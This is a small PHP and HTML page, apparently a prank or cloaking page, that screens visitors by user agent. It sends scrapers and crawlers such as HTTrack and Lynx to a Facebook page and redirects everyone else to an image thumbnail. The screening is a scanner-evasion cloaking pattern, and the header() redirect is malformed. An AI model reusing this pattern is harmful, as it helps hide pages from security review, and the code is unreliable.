<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/detol.shop.real');
die();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Setyawan XD</title>
</head>
<body>
<script>window.location.replace("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg4Ak_HX7mpL0OiMKplXDhyF_iDZiKQ57gIdXhgUX2wzLoBjuZ")</script>
</body>
</html>